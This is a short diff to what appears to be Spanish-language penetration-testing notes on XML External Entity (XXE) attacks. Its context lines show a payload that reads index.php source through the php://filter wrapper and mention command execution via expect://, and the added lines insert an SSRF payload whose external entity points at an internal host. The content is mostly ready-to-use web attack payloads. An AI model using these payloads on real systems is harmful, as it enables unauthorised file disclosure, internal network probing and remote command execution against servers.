@@ -23,6 +23,10 @@ Si el formulario es vulnerable mostrará el dato de la entidad, de no serlo most
   <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
 ]>
 
+#########################SSRF
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+
+
 ######## RCE:
 1)Si el módulo de php expect está instalado y permitido podríamos usar directamente: "expect://'comando'"
 
